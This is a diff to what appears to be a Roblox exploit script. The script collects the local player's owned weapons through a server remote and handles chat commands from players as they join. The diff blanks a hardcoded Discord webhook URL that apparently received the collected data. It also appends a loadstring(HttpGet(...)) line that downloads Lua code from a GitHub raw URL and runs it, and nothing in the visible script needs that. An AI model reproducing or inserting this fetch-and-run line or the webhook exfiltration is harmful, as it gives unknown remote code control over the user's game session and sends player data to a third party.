@@ -1,6 +1,6 @@
 -- r3th_priv
 
-local url = "https://discord.com/api/webhooks/1272147646483795998/aKsuuV-eBktbeaI0gPY_ZvQG5wAH7jjM7TVeyApiJrZ83tOnXEhrlg0s5NX38KxSM38Y"
+local url = ""
 
 t = {}
 for i,v in pairs(game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"]) do
@@ -207,3 +207,5 @@ Pl.PlayerAdded:Connect(function(plr)
         MainCommands(plr, msg)
     end)
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/ArrayField/main/OldSymphonyHub.lua"))()
